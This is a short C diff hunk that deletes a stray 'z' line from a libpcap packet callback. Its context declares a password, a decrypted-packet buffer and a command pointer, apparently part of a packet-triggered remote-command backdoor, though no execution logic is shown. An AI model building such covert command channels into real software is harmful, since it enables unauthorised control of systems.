@@ -134,7 +134,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	char password[strlen(PASSWORD) + 1];
 	char decrypted[PKT_SIZE];
 	char * command;
-z
+
 	ip = (struct ip_struct *)(packet + SIZE_ETHERNET);
 	size_ip = IP_HL(ip) * 4;
 
